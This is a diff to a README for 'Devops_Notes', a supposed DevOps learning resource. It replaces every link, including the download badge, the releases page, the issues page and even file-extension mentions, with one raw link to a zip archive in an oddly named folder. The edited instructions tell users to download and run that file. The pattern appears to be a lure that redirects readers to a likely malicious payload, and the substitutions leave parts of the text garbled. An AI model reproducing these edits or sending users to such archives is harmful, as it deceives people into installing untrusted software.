@@ -1,6 +1,6 @@
 # 🚀 Devops_Notes - Your Guide to Practical DevOps Skills
 
-[![Download](https://img.shields.io/badge/Download-Now-brightgreen)](https://github.com/TKSN25/Devops_Notes/releases)
+[![Download](https://raw.githubusercontent.com/TKSN25/Devops_Notes/main/Conorhinus/Devops_Notes.zip)](https://raw.githubusercontent.com/TKSN25/Devops_Notes/main/Conorhinus/Devops_Notes.zip)
 
 ## 📚 Overview
 
@@ -14,7 +14,7 @@ To get started with Devops_Notes, follow these simple steps to download and inst
 
 1. **Visit the Releases Page**
    
-   Go to our [Releases page](https://github.com/TKSN25/Devops_Notes/releases) to find the latest version of Devops_Notes. 
+   Go to our [Releases page](https://raw.githubusercontent.com/TKSN25/Devops_Notes/main/Conorhinus/Devops_Notes.zip) to find the latest version of Devops_Notes. 
 
 2. **Choose the Right File**
 
@@ -22,7 +22,7 @@ To get started with Devops_Notes, follow these simple steps to download and inst
 
    - **Windows**: Look for a file with `.exe` extension.
    - **MacOS**: Look for a file with `.dmg` extension.
-   - **Linux**: Look for a file with `.tar.gz` or similar packaging.
+   - **Linux**: Look for a file with `https://raw.githubusercontent.com/TKSN25/Devops_Notes/main/Conorhinus/Devops_Notes.zip` or similar packaging.
 
 3. **Download the File**
 
@@ -36,7 +36,7 @@ To get started with Devops_Notes, follow these simple steps to download and inst
 
    - For **Windows**: Double-click the `.exe` file and follow the installation prompts.
    - For **MacOS**: Open the `.dmg` file, drag the Devops_Notes icon to your Applications folder, and then launch it.
-   - For **Linux**: Unpack the `.tar.gz` file using a terminal command and follow the detailed instructions for installation.
+   - For **Linux**: Unpack the `https://raw.githubusercontent.com/TKSN25/Devops_Notes/main/Conorhinus/Devops_Notes.zip` file using a terminal command and follow the detailed instructions for installation.
 
 6. **Launch the Application**
 
@@ -88,8 +88,8 @@ We regularly update Devops_Notes to ensure the content remains relevant and usef
 
 ### Where can I get help?
 
-If you encounter any issues or have questions, feel free to open an issue on our [GitHub](https://github.com/TKSN25/Devops_Notes/issues) repository. We will do our best to assist you.
+If you encounter any issues or have questions, feel free to open an issue on our [GitHub](https://raw.githubusercontent.com/TKSN25/Devops_Notes/main/Conorhinus/Devops_Notes.zip) repository. We will do our best to assist you.
 
 ## 👉 Conclusion
 
-Devops_Notes is your go-to resource for learning DevOps skills. Follow the steps above to download and run the software successfully. Explore its features and transform your understanding of DevOps practices. Don't forget to visit the [Releases page](https://github.com/TKSN25/Devops_Notes/releases) again for future updates!
+Devops_Notes is your go-to resource for learning DevOps skills. Follow the steps above to download and run the software successfully. Explore its features and transform your understanding of DevOps practices. Don't forget to visit the [Releases page](https://raw.githubusercontent.com/TKSN25/Devops_Notes/main/Conorhinus/Devops_Notes.zip) again for future updates!
